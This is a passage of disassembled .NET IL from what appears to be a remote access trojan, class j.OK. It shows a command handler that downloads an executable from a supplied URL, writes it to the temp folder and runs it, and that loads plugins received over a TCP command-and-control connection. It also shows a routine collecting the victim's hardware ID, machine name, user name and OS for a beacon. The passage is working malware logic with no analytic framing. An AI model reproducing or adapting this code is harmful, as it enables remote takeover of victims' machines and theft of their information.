      IL_15bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_15c1:  br.s       IL_15de

      IL_15c3:  ldc.i4.0
      IL_15c4:  call       void j.OK::pr(int32)
      IL_15c9:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_15ce:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_15d3:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_15d8:  pop
      IL_15d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_15de:  leave      IL_19f4

      IL_15e3:  ldloc.2
      IL_15e4:  ldstr      "up"
      IL_15e9:  ldc.i4.0
      IL_15ea:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_15ef:  brtrue     IL_17ac

      IL_15f4:  ldnull
      IL_15f5:  stloc.s    V_5
      IL_15f7:  ldloc.0
      IL_15f8:  ldc.i4.1
      IL_15f9:  ldelem.ref
      IL_15fa:  ldc.i4.0
      IL_15fb:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_1600:  ldc.i4.s   31
      IL_1602:  bne.un.s   IL_1680

      .try
      {
        IL_1604:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_1609:  ldloc.0
        IL_160a:  ldc.i4.0
        IL_160b:  ldelem.ref
        IL_160c:  ldsfld     string j.OK::Y
        IL_1611:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_1616:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_161b:  stloc.s    V_62
        IL_161d:  dup
        IL_161e:  ldarg.0
        IL_161f:  ldloc.s    V_62
        IL_1621:  ldarg.0
        IL_1622:  ldlen
        IL_1623:  conv.i4
        IL_1624:  ldloc.s    V_62
        IL_1626:  sub.ovf
        IL_1627:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_162c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_1631:  call       uint8[] j.OK::ZIP(uint8[])
        IL_1636:  stloc.s    V_5
        IL_1638:  leave      IL_16d8

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_163d:  dup
        IL_163e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1643:  stloc.s    V_63
        IL_1645:  ldloc.s    V_63
        IL_1647:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_164c:  ldstr      "MSG"
        IL_1651:  ldsfld     string j.OK::Y
        IL_1656:  ldstr      "Update ERROR"
        IL_165b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1660:  call       bool j.OK::Send(string)
        IL_1665:  pop
        IL_1666:  ldstr      "bla"
        IL_166b:  call       bool j.OK::Send(string)
        IL_1670:  pop
        IL_1671:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1676:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_167b:  leave      IL_19f4

      }  // end handler
      IL_1680:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_1685:  stloc.s    V_6
      .try
      {
        IL_1687:  ldloc.s    V_6
        IL_1689:  ldloc.0
        IL_168a:  ldc.i4.1
        IL_168b:  ldelem.ref
        IL_168c:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_1691:  stloc.s    V_5
        IL_1693:  leave.s    IL_16d8

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1695:  dup
        IL_1696:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_169b:  stloc.s    V_64
        IL_169d:  ldloc.s    V_64
        IL_169f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_16a4:  ldstr      "MSG"
        IL_16a9:  ldsfld     string j.OK::Y
        IL_16ae:  ldstr      "Update ERROR"
        IL_16b3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_16b8:  call       bool j.OK::Send(string)
        IL_16bd:  pop
        IL_16be:  ldstr      "bla"
        IL_16c3:  call       bool j.OK::Send(string)
        IL_16c8:  pop
        IL_16c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_16ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_16d3:  leave      IL_19f4

      }  // end handler
      IL_16d8:  ldstr      "bla"
      IL_16dd:  call       bool j.OK::Send(string)
      IL_16e2:  pop
      IL_16e3:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_16e8:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_16ed:  stloc.s    V_31
      IL_16ef:  ldloca.s   V_31
      IL_16f1:  constrained. [mscorlib]System.Guid
      IL_16f7:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_16fc:  ldstr      "-"
      IL_1701:  ldstr      ""
      IL_1706:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_170b:  ldstr      ".exe"
      IL_1710:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_1715:  stloc.s    V_7
      .try
      {
        IL_1717:  ldstr      "MSG"
        IL_171c:  ldsfld     string j.OK::Y
        IL_1721:  ldstr      "Updating To "
        IL_1726:  ldloc.s    V_7
        IL_1728:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_172d:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_1732:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1737:  call       bool j.OK::Send(string)
        IL_173c:  pop
        IL_173d:  ldc.i4     0x7d0
        IL_1742:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_1747:  ldloc.s    V_7
        IL_1749:  ldloc.s    V_5
        IL_174b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1750:  ldloc.s    V_7
        IL_1752:  ldstr      ".."
        IL_1757:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_175c:  pop
        IL_175d:  leave.s    IL_17a2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_175f:  dup
        IL_1760:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1765:  stloc.s    V_65
        IL_1767:  ldloc.s    V_65
        IL_1769:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_176e:  ldloc.s    V_65
        IL_1770:  stloc.s    V_66
        IL_1772:  ldstr      "MSG"
        IL_1777:  ldsfld     string j.OK::Y
        IL_177c:  ldstr      "Update ERROR "
        IL_1781:  ldloc.s    V_66
        IL_1783:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1788:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_178d:  call       bool j.OK::Send(string)
        IL_1792:  pop
        IL_1793:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1798:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_179d:  leave      IL_19f4

      }  // end handler
      IL_17a2:  call       void j.OK::UNS()
      IL_17a7:  leave      IL_19f4

      IL_17ac:  ldloc.2
      IL_17ad:  ldstr      "Ex"
      IL_17b2:  ldc.i4.0
      IL_17b3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_17b8:  brtrue     IL_187d

      IL_17bd:  ldsfld     object j.OK::PLG
      IL_17c2:  brtrue.s   IL_1816

      IL_17c4:  ldstr      "PLG"
      IL_17c9:  call       bool j.OK::Send(string)
      IL_17ce:  pop
      IL_17cf:  ldc.i4.0
      IL_17d0:  stloc.s    V_69
      IL_17d2:  br.s       IL_17e4

      IL_17d4:  ldloc.s    V_69
      IL_17d6:  ldc.i4.1
      IL_17d7:  add.ovf
      IL_17d8:  stloc.s    V_69
      IL_17da:  ldc.i4     0x3e8
      IL_17df:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_17e4:  ldsfld     object j.OK::PLG
      IL_17e9:  ldnull
      IL_17ea:  cgt.un
      IL_17ec:  ldloc.s    V_69
      IL_17ee:  ldc.i4.s   20
      IL_17f0:  ceq
      IL_17f2:  or
      IL_17f3:  ldsfld     bool j.OK::Cn
      IL_17f8:  ldc.i4.0
      IL_17f9:  ceq
      IL_17fb:  or
      IL_17fc:  brfalse.s  IL_17d4

      IL_17fe:  ldsfld     object j.OK::PLG
      IL_1803:  ldnull
      IL_1804:  ceq
      IL_1806:  ldsfld     bool j.OK::Cn
      IL_180b:  ldc.i4.0
      IL_180c:  ceq
      IL_180e:  or
      IL_180f:  brfalse.s  IL_1816

      IL_1811:  leave      IL_19f4

      IL_1816:  ldc.i4.1
      IL_1817:  newarr     [mscorlib]System.Object
      IL_181c:  dup
      IL_181d:  ldc.i4.0
      IL_181e:  ldarg.0
      IL_181f:  stelem.ref
      IL_1820:  stloc.s    V_67
      IL_1822:  ldc.i4.1
      IL_1823:  newarr     [mscorlib]System.Boolean
      IL_1828:  dup
      IL_1829:  ldc.i4.0
      IL_182a:  ldc.i4.1
      IL_182b:  stelem.i1
      IL_182c:  stloc.s    V_68
      IL_182e:  ldsfld     object j.OK::PLG
      IL_1833:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1838:  ldnull
      IL_1839:  ldstr      "ind"
      IL_183e:  ldloc.s    V_67
      IL_1840:  ldnull
      IL_1841:  ldnull
      IL_1842:  ldloc.s    V_68
      IL_1844:  ldc.i4.1
      IL_1845:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_184a:  pop
      IL_184b:  ldloc.s    V_68
      IL_184d:  ldc.i4.0
      IL_184e:  ldelem.u1
      IL_184f:  brfalse    IL_1948

      IL_1854:  ldloc.s    V_67
      IL_1856:  ldc.i4.0
      IL_1857:  ldelem.ref
      IL_1858:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_185d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1862:  ldtoken    uint8[]
      IL_1867:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_186c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_1871:  castclass  uint8[]
      IL_1876:  starg.s    b
      IL_1878:  br         IL_1948

      IL_187d:  ldloc.2
      IL_187e:  ldstr      "PLG"
      IL_1883:  ldc.i4.0
      IL_1884:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1889:  brtrue     IL_1948

      IL_188e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1893:  ldloc.0
      IL_1894:  ldc.i4.0
      IL_1895:  ldelem.ref
      IL_1896:  ldsfld     string j.OK::Y
      IL_189b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_18a0:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_18a5:  stloc.s    V_70
      IL_18a7:  dup
      IL_18a8:  ldarg.0
      IL_18a9:  ldloc.s    V_70
      IL_18ab:  ldarg.0
      IL_18ac:  ldlen
      IL_18ad:  conv.i4
      IL_18ae:  ldloc.s    V_70
      IL_18b0:  sub.ovf
      IL_18b1:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_18b6:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_18bb:  call       uint8[] j.OK::ZIP(uint8[])
      IL_18c0:  ldstr      "A"
      IL_18c5:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_18ca:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_18cf:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_18d4:  stsfld     object j.OK::PLG
      IL_18d9:  ldsfld     object j.OK::PLG
      IL_18de:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_18e3:  ldnull
      IL_18e4:  ldstr      "H"
      IL_18e9:  ldc.i4.1
      IL_18ea:  newarr     [mscorlib]System.Object
      IL_18ef:  dup
      IL_18f0:  ldc.i4.0
      IL_18f1:  ldsfld     string j.OK::H
      IL_18f6:  stelem.ref
      IL_18f7:  ldnull
      IL_18f8:  ldnull
      IL_18f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_18fe:  ldsfld     object j.OK::PLG
      IL_1903:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1908:  ldnull
      IL_1909:  ldstr      "P"
      IL_190e:  ldc.i4.1
      IL_190f:  newarr     [mscorlib]System.Object
      IL_1914:  dup
      IL_1915:  ldc.i4.0
      IL_1916:  ldsfld     string j.OK::P
      IL_191b:  stelem.ref
      IL_191c:  ldnull
      IL_191d:  ldnull
      IL_191e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1923:  ldsfld     object j.OK::PLG
      IL_1928:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_192d:  ldnull
      IL_192e:  ldstr      "c"
      IL_1933:  ldc.i4.1
      IL_1934:  newarr     [mscorlib]System.Object
      IL_1939:  dup
      IL_193a:  ldc.i4.0
      IL_193b:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_1940:  stelem.ref
      IL_1941:  ldnull
      IL_1942:  ldnull
      IL_1943:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1948:  leave      IL_19f4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_194d:  dup
      IL_194e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_1953:  stloc.s    V_71
      IL_1955:  ldloc.s    V_71
      IL_1957:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_195c:  ldloc.s    V_71
      IL_195e:  stloc.s    V_72
      IL_1960:  ldloc.0
      IL_1961:  ldlen
      IL_1962:  conv.i4
      IL_1963:  ldc.i4.0
      IL_1964:  ble.s      IL_1991

      IL_1966:  ldloc.0
      IL_1967:  ldc.i4.0
      IL_1968:  ldelem.ref
      IL_1969:  ldstr      "Ex"
      IL_196e:  ldc.i4.0
      IL_196f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1974:  ldc.i4.0
      IL_1975:  ceq
      IL_1977:  ldloc.0
      IL_1978:  ldc.i4.0
      IL_1979:  ldelem.ref
      IL_197a:  ldstr      "PLG"
      IL_197f:  ldc.i4.0
      IL_1980:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1985:  ldc.i4.0
      IL_1986:  ceq
      IL_1988:  or
      IL_1989:  brfalse.s  IL_1991

      IL_198b:  ldnull
      IL_198c:  stsfld     object j.OK::PLG
      IL_1991:  nop
      .try
      {
        IL_1992:  ldc.i4.5
        IL_1993:  newarr     [mscorlib]System.String
        IL_1998:  dup
        IL_1999:  ldc.i4.0
        IL_199a:  ldstr      "ER"
        IL_199f:  stelem.ref
        IL_19a0:  dup
        IL_19a1:  ldc.i4.1
        IL_19a2:  ldsfld     string j.OK::Y
        IL_19a7:  stelem.ref
        IL_19a8:  dup
        IL_19a9:  ldc.i4.2
        IL_19aa:  ldloc.0
        IL_19ab:  ldc.i4.0
        IL_19ac:  ldelem.ref
        IL_19ad:  stelem.ref
        IL_19ae:  dup
        IL_19af:  ldc.i4.3
        IL_19b0:  ldsfld     string j.OK::Y
        IL_19b5:  stelem.ref
        IL_19b6:  dup
        IL_19b7:  ldc.i4.4
        IL_19b8:  ldloc.s    V_72
        IL_19ba:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_19bf:  stelem.ref
        IL_19c0:  call       string [mscorlib]System.String::Concat(string[])
        IL_19c5:  call       bool j.OK::Send(string)
        IL_19ca:  pop
        IL_19cb:  leave.s    IL_19e8

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_19cd:  dup
        IL_19ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_19d3:  stloc.s    V_73
        IL_19d5:  ldloc.s    V_73
        IL_19d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_19dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_19e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_19e6:  leave.s    IL_19e8

      }  // end handler
      IL_19e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_19ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_19f2:  leave.s    IL_19f4

    }  // end handler
    IL_19f4:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1056 (0x420)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [mscorlib]System.DateTime V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             string[] V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             string[] V_14,
             int32 V_15,
             class [mscorlib]System.Exception V_16)
    IL_0000:  ldstr      "ll"
    IL_0005:  ldsfld     string j.OK::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.0
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  ldstr      ""
      IL_001a:  call       object j.OK::GTV(string,
                                            object)
      IL_001f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0024:  ldstr      ""
      IL_0029:  ldc.i4.0
      IL_002a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002f:  brfalse.s  IL_0060

      IL_0031:  ldloc.0
      IL_0032:  ldsflda    string j.OK::VN
      IL_0037:  call       string j.OK::DEB(string&)
      IL_003c:  ldstr      "_"
      IL_0041:  call       string j.OK::HWD()
      IL_0046:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004b:  stloc.2
      IL_004c:  ldloca.s   V_2
      IL_004e:  call       string j.OK::ENB(string&)
      IL_0053:  ldsfld     string j.OK::Y
      IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005d:  stloc.0
      IL_005e:  br.s       IL_00a4

      IL_0060:  ldloc.0
      IL_0061:  ldstr      "vn"
      IL_0066:  ldstr      ""
      IL_006b:  call       object j.OK::GTV(string,
                                            object)
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_007a:  stloc.3
      IL_007b:  ldloca.s   V_3
      IL_007d:  call       string j.OK::DEB(string&)
      IL_0082:  ldstr      "_"
      IL_0087:  call       string j.OK::HWD()
      IL_008c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0091:  stloc.2
      IL_0092:  ldloca.s   V_2
      IL_0094:  call       string j.OK::ENB(string&)
      IL_0099:  ldsfld     string j.OK::Y
      IL_009e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a3:  stloc.0
      IL_00a4:  leave.s    IL_00da

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a6:  dup
      IL_00a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ac:  stloc.s    V_4
      IL_00ae:  ldloc.s    V_4
      IL_00b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b5:  ldloc.0
      IL_00b6:  call       string j.OK::HWD()
      IL_00bb:  stloc.2
      IL_00bc:  ldloca.s   V_2
      IL_00be:  call       string j.OK::ENB(string&)
      IL_00c3:  ldsfld     string j.OK::Y
      IL_00c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00cd:  stloc.0
      IL_00ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d8:  leave.s    IL_00da

    }  // end handler
    IL_00da:  nop
    .try
    {
      IL_00db:  ldloc.0
      IL_00dc:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00e1:  ldsfld     string j.OK::Y
      IL_00e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00eb:  stloc.0
      IL_00ec:  leave.s    IL_011a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ee:  dup
      IL_00ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00f4:  stloc.s    V_5
      IL_00f6:  ldloc.s    V_5
      IL_00f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fd:  ldloc.0
      IL_00fe:  ldstr      "\?\?"
      IL_0103:  ldsfld     string j.OK::Y
      IL_0108:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010d:  stloc.0
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0113:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0118:  leave.s    IL_011a

    }  // end handler
    IL_011a:  nop
    .try
    {
      IL_011b:  ldloc.0
      IL_011c:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0121:  ldsfld     string j.OK::Y
      IL_0126:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_012b:  stloc.0
      IL_012c:  leave.s    IL_015a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_012e:  dup
      IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0134:  stloc.s    V_6
      IL_0136:  ldloc.s    V_6
      IL_0138:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013d:  ldloc.0
      IL_013e:  ldstr      "\?\?"
      IL_0143:  ldsfld     string j.OK::Y
      IL_0148:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_014d:  stloc.0
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0153:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0158:  leave.s    IL_015a

    }  // end handler
    IL_015a:  nop
    .try
    {
      IL_015b:  ldloc.0
      IL_015c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0161:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0166:  stloc.s    V_7
      IL_0168:  ldloca.s   V_7
      IL_016a:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_016f:  stloc.s    V_7
      IL_0171:  ldloca.s   V_7
      IL_0173:  ldstr      "yy-MM-dd"
      IL_0178:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_017d:  ldsfld     string j.OK::Y
      IL_0182:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0187:  stloc.0
      IL_0188:  leave.s    IL_01b6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_018a:  dup
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0190:  stloc.s    V_8
      IL_0192:  ldloc.s    V_8
      IL_0194:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0199:  ldloc.0
      IL_019a:  ldstr      "\?\?-\?\?-\?\?"
      IL_019f:  ldsfld     string j.OK::Y
      IL_01a4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01a9:  stloc.0
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b4:  leave.s    IL_01b6

    }  // end handler
    IL_01b6:  ldloc.0
    IL_01b7:  ldsfld     string j.OK::Y
    IL_01bc:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01c1:  stloc.0
    .try
    {
      IL_01c2:  ldloc.0
      IL_01c3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01c8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01cd:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01d2:  ldstr      "Microsoft"
      IL_01d7:  ldstr      ""
      IL_01dc:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e1:  ldstr      "Windows"
      IL_01e6:  ldstr      "Win"
      IL_01eb:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f0:  ldstr      bytearray (AE 00 ) 
      IL_01f5:  ldstr      ""
      IL_01fa:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ff:  ldstr      bytearray (22 21 )                                           // "!
      IL_0204:  ldstr      ""
      IL_0209:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_020e:  ldstr      "  "
      IL_0213:  ldstr      " "
      IL_0218:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_021d:  ldstr      " Win"
      IL_0222:  ldstr      "Win"
      IL_0227:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_022c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0231:  stloc.0
      IL_0232:  leave.s    IL_025b

    }  // end .try
